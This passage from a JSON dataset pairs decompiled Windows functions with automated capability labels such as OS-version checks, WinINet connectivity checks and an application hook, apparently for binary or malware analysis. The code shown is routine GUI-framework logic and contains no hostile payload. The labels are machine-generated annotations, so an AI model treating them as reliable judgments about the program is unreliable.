    },
    "004449d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004449d0(void)\n\n{\n    int32_t in_EAX;\n    \n    if (in_EAX != 0) {\n        do {\n            if (*(in_EAX + 0x84) != 0) {\n                fcn.00405584();\n                return;\n            }\n            in_EAX = *(in_EAX + 0x30);\n        } while (in_EAX != 0);\n    }\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 105
    },
    "00444a08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00444a08(void)\n\n{\n    int32_t in_EAX;\n    \n    for (; (in_EAX != 0 && (*(in_EAX + 0x8d) == '\\0')); in_EAX = *(in_EAX + 0x30)) {\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "00444a28": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00444a28(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    if (*0x499c1c != 0) {\n        uStack24 = 0x444a59;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack28;\n        fcn.004473f8();\n        *in_FS_OFFSET = uStack28;\n    }\n    return;\n}\n",
        "token_count": 122
    },
    "00444a7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00444a7c(void)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    \n    *0x499c30 = sub.kernel32.dll_GetCurrentThreadId_1();\n    while( true ) {\n        iVar1 = sub.kernel32.dll_WaitForSingleObject();\n        if (iVar1 != 0x102) break;\n        if (*0x499c1c != 0) {\n            if (*(*0x499c1c + 0x60) != 0) {\n                sub.user32.dll_GetCursorPos();\n                iVar1 = fcn.0044edd8();\n                if (iVar1 == 0) {\n                    fcn.004474a4();\n                }\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 166
    },
    "00444ad8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00444ad8(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    \n    uVar1 = sub.user32.dll_CallNextHookEx(*0x499c38, arg_8h, arg_ch, arg_10h);\n    if ((-1 < arg_8h) && (*0x499c1c != 0)) {\n        fcn.004463e8();\n    }\n    return uVar1;\n}\n",
        "token_count": 112
    },
    "00444b1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00444b1c(void)\n\n{\n    uint uStack20;\n    code *pcStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    if (*(*0x499c1c + 0xad) == '\\0') {\n        if (*0x499c38 == 0) {\n            uStack8 = 0x444b39;\n            uStack8 = sub.kernel32.dll_GetCurrentThreadId_1();\n            uStack12 = 0;\n            pcStack16 = fcn.00444ad8;\n            uStack20 = 3;\n            *0x499c38 = sub.user32.dll_SetWindowsHookExA();\n        }\n        if (*0x499c34 == 0) {\n            *0x499c34 = sub.kernel32.dll_CreateEventA(0, 0, 0, 0);\n        }\n        if (*0x499c3c == 0) {\n            *0x499c3c = sub.kernel32.dll_CreateThread_1(0, 1000, fcn.00444a7c, 0, 0, &stack0xffffffec);\n        }\n    }\n    return;\n}\n",
        "token_count": 257
    },
    "00444b90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "set application hook"
        ],
        "decompiled_code": "\nvoid fcn.00444b90(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x499c38 != 0) {\n        sub.user32.dll_UnhookWindowsHookEx(*0x499c38);\n    }\n    *0x499c38 = 0;\n    if (*0x499c3c != 0) {\n        sub.kernel32.dll_SetEvent(*0x499c34);\n        iVar1 = sub.kernel32.dll_GetCurrentThreadId_1();\n        if (iVar1 != *0x499c30) {\n            sub.kernel32.dll_WaitForSingleObject(*0x499c3c, 0xffffffff);\n        }\n        sub.kernel32.dll_CloseHandle_1(*0x499c3c);\n        *0x499c3c = 0;\n    }\n    return;\n}\n",
        "token_count": 178
    },
    "00444bec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.00444bec(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint auStack8 [2];\n    \n    auStack8[0] = 8;\n    uVar2 = 8;\n    uVar1 = sub.user32.dll_SystemParametersInfoA(0x48, 8, auStack8, 0);\n    if (uVar1 != 0) {\n        return CONCAT44(uVar2, uVar1 & 0xffffff00 | uVar2 != 0);\n    }\n    return uVar2 << 0x20;\n}\n",
        "token_count": 134
    },
    "00444d60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\ncode * __fastcall fcn.00444d60(uint param_1, char param_2)\n\n{\n    code **ppcVar1;\n    code *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uchar *puVar4;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar5;\n    uint lpFilename;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    var_1h._0_1_ = param_2;\n    fcn.0041ffc4();\n    ppcVar1 = *0x494a5c;\n    if (*(*0x494a5c + 2) == 0) {\n        (*0x494a5c)[1] = in_EAX;\n        *ppcVar1 = fcn.004467a4;\n    }\n    ppcVar1 = *0x494b3c;\n    if (*(*0x494b3c + 2) == 0) {\n        (*0x494b3c)[1] = in_EAX;\n        *ppcVar1 = fcn.004469b0;\n    }\n    in_EAX[0x34] = 0x0;\n    uVar2 = fcn.00404620();\n    *(in_EAX + 0x90) = uVar2;\n    uVar2 = fcn.00404620();\n    *(in_EAX + 0x98) = uVar2;\n    uVar2 = fcn.00404620();\n    *(in_EAX + 0xb0) = uVar2;\n    *(in_EAX + 0x60) = 0;\n    *(in_EAX + 0x84) = 0;\n    *(in_EAX + 0x5c) = 0xff000018;\n    *(in_EAX + 0x78) = 500;\n    in_EAX[0x7c] = 0x1;\n    *(in_EAX + 0x80) = 0;\n    *(in_EAX + 0x74) = 0x9c4;\n    in_EAX[0x88] = 0x0;\n    in_EAX[0xa5] = 0x1;\n    in_EAX[0xbc] = 0x1;\n    uVar2 = fcn.0042aec8();\n    *(in_EAX + 0xa0) = uVar2;\n    sub.user32.dll_LoadIconA(**0x494950, 0x444f70);\n    fcn.0042b29c();\n    iVar3 = *(in_EAX + 0xa0);\n    *(iVar3 + 0x14) = in_EAX;\n    *(iVar3 + 0x10) = 0x447074;\n    sub.kernel32.dll_GetModuleFileNameA_1(**0x494950, &lpFilename, 0x100);\n    sub.user32.dll_OemToCharA(&lpFilename, &lpFilename);\n    iVar3 = fcn.0040ea38();\n    if (iVar3 != 0) {\n        fcn.0040a8bc();\n    }\n    puVar4 = fcn.0040ea6c();\n    if (puVar4 != NULL) {\n        *puVar4 = 0;\n    }\n    uVar2 = sub.user32.dll_CharNextA_1(&lpFilename);\n    sub.user32.dll_CharLowerA(uVar2);\n    fcn.004057a0();\n    in_EAX[0xd4] = 0x0;\n    uVar5 = 0x446488;\n    uVar2 = fcn.00421140(0x446488, in_EAX);\n    *(in_EAX + 200) = uVar2;\n    if (**0x4947e8 == '\\0') {\n        fcn.004450b4();\n    }\n    in_EAX[0x59] = 0x1;\n    in_EAX[0x5a] = 0x1;\n    in_EAX[0x5b] = 0x1;\n    in_EAX[0xa6] = 0x1;\n    *(in_EAX + 0xa8) = 0;\n    fcn.0044724c();\n    fcn.00447db0();\n    if (var_1h != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uVar5;\n    }\n    return in_EAX;\n}\n",
        "token_count": 1041
    },
    "004450b4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004450b4(void)\n\n{\n    int16_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_2ch;\n    uint lpWndClass;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x445250;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    if ((*(in_EAX + 0xac) == '\\0') && (**0x494ba0 == '\\0')) {\n        uVar2 = fcn.00421084(fcn.004458cc, in_EAX);\n        *(in_EAX + 0x40) = uVar2;\n        *0x492600 = sub.user32.dll_DefWindowProcA;\n        iVar3 = sub.user32.dll_GetClassInfoA(*0x4977f8, *0x492620, &fcn.004450b4::lpWndClass);\n        if (iVar3 == 0) {\n            *0x49260c = *0x4977f8;\n            iVar1 = sub.user32.dll_RegisterClassA(0x4925fc);\n            if (iVar1 == 0) {\n                fcn.00407550();\n                fcn.0040dafc();\n                fcn.00404ec4();\n            }\n        }\n        uVar4 = (***0x494970)(0, 0x84ca0000);\n        iVar3 = uVar4 >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((uVar4 & 1) != 0);\n        }\n        uVar4 = (***0x494970)(1, iVar3);\n        uVar2 = *0x4977f8;\n        iVar3 = uVar4 >> 1;\n        if (iVar3 < 0) {\n            iVar3 = iVar3 + ((uVar4 & 1) != 0);\n        }\n        fcn.004059dc();\n        uVar2 = fcn.0040857c(0, uVar2, 0, 0, 0, 0, iVar3, in_stack_00000030, in_stack_00000034);\n        *(in_EAX + 0x30) = uVar2;\n        *(in_EAX + 0xac) = 1;\n        uStack20 = *(in_EAX + 0x30);\n        sub.user32.dll_SetWindowLongA();\n        if (**0x494a10 != '\\0') {\n            fcn.00445f74();\n            uStack8 = *(in_EAX + 0x30);\n            uStack12 = 0x4451e9;\n            sub.user32.dll_SendMessageA();\n            uStack12 = 0x4451f0;\n            uStack12 = fcn.00445f74();\n            uStack16 = 0xfffffff2;\n            uStack20 = *(in_EAX + 0x30);\n            uStack24 = 0x4451fc;\n            sub.user32.dll_SetClassLongA();\n        }\n        uStack24 = 0;\n        uStack28 = *(in_EAX + 0x30);\n        uStack32 = 0x445207;\n        uVar2 = sub.user32.dll_GetSystemMenu();\n        uStack32 = 0;\n        uStack36 = 0xf030;\n        lpWndClass = 0x445216;\n        uStack40 = uVar2;\n        sub.user32.dll_DeleteMenu();\n        lpWndClass = 0;\n        puStack56 = 0x445223;\n        uStack64 = uVar2;\n        sub.user32.dll_DeleteMenu();\n        if (**0x494a10 != '\\0') {\n            puStack56 = NULL;\n            uStack60 = 0xf010;\n            uStack64 = uVar2;\n            sub.user32.dll_DeleteMenu();\n        }\n    }\n    *in_FS_OFFSET = uStack64;\n    puStack56 = 0x445257;\n    uStack60 = 0x44524f;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 1016
    },
    "004452bc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004452bc(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    \n    uVar3 = 0xffffffff;\n    if (*0x499c1c == 0) {\n        return 0xffffffff;\n    }\n    iVar1 = sub.user32.dll_GetWindow(arg_8h, 4);\n    if (iVar1 == *(*0x499c1c + 0x30)) {\n        uVar2 = sub.user32.dll_GetWindowLongA(arg_8h, 0xffffffec);\n        if (((uVar2 & 8) == 0) ||\n           (((*(*0x499c1c + 0x44) != 0 && (*(arg_ch + 1) == '\\0')) && (iVar1 = fcn.004585f8(),  arg_8h == iVar1)))) {\n            *arg_ch = arg_8h;\n            uVar3 = 0;\n        }\n        else {\n            fcn.00419740();\n        }\n        return uVar3;\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 257
    },
    "00445334": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00445334(uint param_1, uchar param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    int32_t iStack16;\n    uchar uStack12;\n    \n    iStack16 = *(in_EAX + 0x30);\n    if (iStack16 != 0) {\n        if (*(in_EAX + 0x94) == 0) {\n            pcVar4 = fcn.004452bc;\n            uStack12 = param_2;\n            sub.user32.dll_EnumWindows(fcn.004452bc, &iStack16);\n            if (*(*(in_EAX + 0x90) + 8) != 0) {\n                uVar1 = sub.user32.dll_GetWindow(pcVar4, 3);\n                uVar2 = sub.user32.dll_GetWindowLongA(uVar1, 0xffffffec, uVar1);\n                if ((uVar2 & 8) != 0) {\n                    uVar1 = 0xfffffffe;\n                }\n                iVar3 = *(*(in_EAX + 0x90) + 8) + -1;\n                if (-1 < iVar3) {\n                    do {\n                        uVar1 = fcn.00419898(uVar1, 0, 0, 0, 0, 0x213);\n                        sub.user32.dll_SetWindowPos();\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != -1);\n                }\n            }\n        }\n        *(in_EAX + 0x94) = *(in_EAX + 0x94) + 1;\n    }\n    return;\n}\n",
        "token_count": 383
    },
    "004453d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004453d8(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0xc4) = *(in_EAX + 0xc4) + 1;\n    if ((*(in_EAX + 0xc4) == 1) && (*(in_EAX + 0x10a) != 0)) {\n        (**(in_EAX + 0x108))();\n    }\n    return;\n}\n",
        "token_count": 100
    },
    "00445404": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00445404(void)\n\n{\n    int32_t in_EAX;\n    \n    *(in_EAX + 0xc4) = *(in_EAX + 0xc4) + -1;\n    if ((*(in_EAX + 0xc4) == 0) && (*(in_EAX + 0x112) != 0)) {\n        (**(in_EAX + 0x110))();\n    }\n    return;\n}\n",
        "token_count": 98
    },
    "00445490": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00445490(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if (((*(in_EAX + 0x30) != 0) && (0 < *(in_EAX + 0x94))) &&\n       (*(in_EAX + 0x94) = *(in_EAX + 0x94) + -1,  *(in_EAX + 0x94) == 0)) {\n        iVar1 = *(*(in_EAX + 0x90) + 8) + -1;\n        if (-1 < iVar1) {\n            do {\n                fcn.00419898(0xffffffff, 0, 0, 0, 0, 0x213);\n                sub.user32.dll_SetWindowPos();\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        (**(**(in_EAX + 0x90) + 8))();\n    }\n    return;\n}\n",
        "token_count": 219
    },
    "004455ec": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004455ec(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    code *pcVar4;\n    \n    if (*(*0x499c1c + 0x30) != 0) {\n        if (param_2 == '\\0') {\n            if (*(in_EAX + 0x9c) == 0) {\n                uVar2 = fcn.00447c2c();\n                pcVar4 = fcn.00445518;\n                sub.user32.dll_EnumWindows(fcn.00445518, uVar2);\n                if (*(in_EAX + 0x44) != 0) {\n                    cVar1 = fcn.0044821c();\n                    if (cVar1 != '\\0') {\n                        iVar3 = fcn.00406774();\n                        if (-1 < iVar3) {\n                            do {\n                                pcVar4 = *(*0x499c40 + iVar3 * 4);\n                                sub.user32.dll_ShowWindow();\n                                iVar3 = iVar3 + -1;\n                            } while (iVar3 != -1);\n                        }\n                    }\n                }\n                iVar3 = *(*(in_EAX + 0x98) + 8) + -1;\n                if (-1 < iVar3) {\n                    do {\n                        pcVar4 = fcn.00419898(0, pcVar4);\n                        sub.user32.dll_ShowOwnedPopups();\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != -1);\n                }\n            }\n            *(in_EAX + 0x9c) = *(in_EAX + 0x9c) + 1;\n        }\n        else if ((0 < *(in_EAX + 0x9c)) && (*(in_EAX + 0x9c) = *(in_EAX + 0x9c) + -1,  *(in_EAX + 0x9c) == 0)) {\n            if (*(in_EAX + 0x44) != 0) {\n                cVar1 = fcn.0044821c();\n                if (cVar1 != '\\0') {\n                    iVar3 = fcn.00406774();\n                    if (-1 < iVar3) {\n                        do {\n                            sub.user32.dll_ShowWindow();\n                            iVar3 = iVar3 + -1;\n                        } while (iVar3 != -1);\n                    }\n                }\n            }\n            iVar3 = *(*(in_EAX + 0x98) + 8) + -1;\n            if (-1 < iVar3) {\n                do {\n                    fcn.00419898(-(param_2 != '\\0'));\n                    sub.user32.dll_ShowOwnedPopups();\n                    iVar3 = iVar3 + -1;\n                } while (iVar3 != -1);\n            }\n            (**(**(in_EAX + 0x98) + 8))();\n            fcn.00406928(0);\n        }\n    }\n    return;\n}\n",
        "token_count": 662
    },
    "00445750": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00445750(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x494d28 + 0xd) != '\\0') && (*(in_EAX + 0x34) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 67
    },
    "00445768": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00445768(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x494d28 + 0xd) != '\\0') && (*(in_EAX + 0x34) == '\\x01')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 68
    },
    "00445780": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00445780(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((*param_2 == *0x499c28) || (*param_2 == 0x1a)) {\n        if (*(in_EAX + 0x59) != '\\0') {\n            sub.kernel32.dll_SetThreadLocale(0x400);\n            fcn.0040ebcc();\n        }\n        if (*(in_EAX + 0x5a) != '\\0') {\n            fcn.00444344();\n        }\n        if (*param_2 == *0x499c28) {\n            fcn.004449c4();\n        }\n    }\n    return 0;\n}\n",
        "token_count": 163
    },
    "004457d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004457d8(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x445835;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    if (*(in_EAX + 0x162) != 0) {\n        fcn.00405728();\n        (**(in_EAX + 0x160))(param_2 + 0xc, 0);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x44583c;\n    uStack24 = 0x445834;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 206
    },
    "00445f90": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00445f90(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = fcn.0043b75c();\n    if (iVar2 != 0) {\n        return;\n    }\n    *0x499c2c = 1;\n    fcn.00445430();\n    sub.user32.dll_SetActiveWindow(*(in_EAX + 0x30));\n    fcn.004455ec();\n    if ((*(in_EAX + 0x44) != 0) && ((*(in_EAX + 0x5b) != '\\0' || (*(*(in_EAX + 0x44) + 0x57) != '\\0')))) {\n        uVar3 = fcn.004585f8();\n        iVar2 = sub.user32.dll_IsWindowEnabled(uVar3);\n        if (iVar2 != 0) {\n            cVar1 = fcn.0044821c();\n            if (cVar1 == '\\0') {\n                uVar3 = fcn.0043dfbc(*(*(in_EAX + 0x44) + 0x48), 0, 0x40);\n                uVar3 = fcn.0043df9c(uVar3);\n                uVar3 = fcn.004585f8(uVar3);\n                sub.user32.dll_SetWindowPos(*(in_EAX + 0x30), uVar3);\n                sub.user32.dll_DefWindowProcA(*(in_EAX + 0x30), 0x112, 0xf020, 0);\n            }\n            else {\n                fcn.0043fdb4();\n            }\n            goto code_r0x00446054;\n        }\n    }\n    fcn.00444c44();\ncode_r0x00446054:\n    if (*(in_EAX + 0x142) != 0) {\n        (**(in_EAX + 0x140))();\n    }\n    return;\n}\n",
        "token_count": 441
    },
    "00446070": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00446070(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    \n    iVar2 = fcn.0043b75c();\n    if (iVar2 == 0) {\n        return;\n    }\n    *0x499c2c = 0;\n    sub.user32.dll_SetActiveWindow(*(in_EAX + 0x30));\n    if (*(in_EAX + 0x44) == 0) goto code_r0x00446137;\n    cVar1 = fcn.0044821c();\n    if (cVar1 != '\\0') {\n        uVar3 = fcn.004585f8(9);\n        sub.user32.dll_ShowWindow(uVar3);\n        goto code_r0x00446137;\n    }\n    if ((*(in_EAX + 0x5b) == '\\0') && (*(*(in_EAX + 0x44) + 0x57) == '\\0')) {\ncode_r0x004460f3:\n        fcn.00444c44();\n    }\n    else {\n        uVar3 = fcn.004585f8();\n        iVar2 = sub.user32.dll_IsWindowEnabled(uVar3);\n        if (iVar2 == 0) goto code_r0x004460f3;\n        sub.user32.dll_DefWindowProcA(*(in_EAX + 0x30), 0x112, 0xf120, 0);\n    }\n    uVar4 = (***0x494970)(1, 0, 0, 0x40);\n    iVar2 = uVar4 >> 1;\n    if (iVar2 < 0) {\n        iVar2 = iVar2 + ((uVar4 & 1) != 0);\n    }\n    uVar4 = (***0x494970)(0, iVar2);\n    iVar2 = uVar4 >> 1;\n    if (iVar2 < 0) {\n        iVar2 = iVar2 + ((uVar4 & 1) != 0);\n    }\n    sub.user32.dll_SetWindowPos(*(in_EAX + 0x30), 0, iVar2);\ncode_r0x00446137:\n    iVar2 = *(in_EAX + 0x44);\n    if (((iVar2 != 0) && (*(iVar2 + 0x273) == '\\x01')) && (*(iVar2 + 0x57) == '\\0')) {\n        fcn.0043fdb4();\n        fcn.00442bac();\n    }\n    fcn.00445490();\n    fcn.004455ec();\n    if (*(*0x499c20 + 100) != 0) {\n        uVar3 = fcn.004585f8();\n        sub.user32.dll_SetFocus(uVar3);\n    }\n    if (*(in_EAX + 0x14a) != 0) {\n        (**(in_EAX + 0x148))();\n    }\n    return;\n}\n",
        "token_count": 664
    },
    "0044625c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.0044625c(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    if (*(in_EAX + 0xb8) != 0) {\n        iVar1 = sub.user32.dll_IsWindowUnicode(*param_2);\n        if (iVar1 == 0) {\n            iVar1 = sub.user32.dll_IsDialogMessageA(*(in_EAX + 0xb8), param_2);\n            bVar2 = iVar1 != 0;\n        }\n        else {\n            iVar1 = sub.user32.dll_IsDialogMessageW(*(in_EAX + 0xb8), param_2);\n            bVar2 = iVar1 != 0;\n        }\n    }\n    return bVar2;\n}\n",
        "token_count": 185
    },
    "004462a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nbool __fastcall fcn.004462a4(uint param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    bool bVar2;\n    \n    bVar2 = false;\n    iVar1 = *(in_EAX + 0x44);\n    if ((((iVar1 != 0) && (*(iVar1 + 0x277) == '\\x02')) && (*(*0x499c20 + 0x6c) != 0)) &&\n       (*(*(*0x499c20 + 0x6c) + 0x277) == '\\x01')) {\n        iVar1 = sub.user32.dll_TranslateMDISysAccel(*(iVar1 + 0x29c), param_2);\n        bVar2 = iVar1 != 0;\n    }\n    return bVar2;\n}\n",
        "token_count": 186
    },
    "0044641c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
